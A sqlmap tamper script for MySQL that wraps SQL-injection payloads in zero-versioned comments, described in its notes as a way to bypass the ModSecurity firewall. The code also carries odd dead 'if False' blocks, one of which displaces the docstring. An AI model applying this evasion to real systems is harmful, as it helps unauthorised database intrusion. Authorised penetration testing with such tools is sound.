"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import os
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.HIGHER

def dependencies():
    if False:
        i = 10
        return i + 15
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split('.')[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    if False:
        i = 10
        return i + 15
    "\n    Embraces complete query with (MySQL) zero-versioned comment\n\n    Requirement:\n        * MySQL\n\n    Tested against:\n        * MySQL 5.0\n\n    Notes:\n        * Useful to bypass ModSecurity WAF\n\n    >>> tamper('1 AND 2>1--')\n    '1 /*!00000AND 2>1*/--'\n    "
    retVal = payload
    if payload:
        postfix = ''
        for comment in ('#', '--', '/*'):
            if comment in payload:
                postfix = payload[payload.find(comment):]
                payload = payload[:payload.find(comment)]
                break
        if ' ' in payload:
            retVal = '%s /*!00000%s*/%s' % (payload[:payload.find(' ')], payload[payload.find(' ') + 1:], postfix)
    return retVal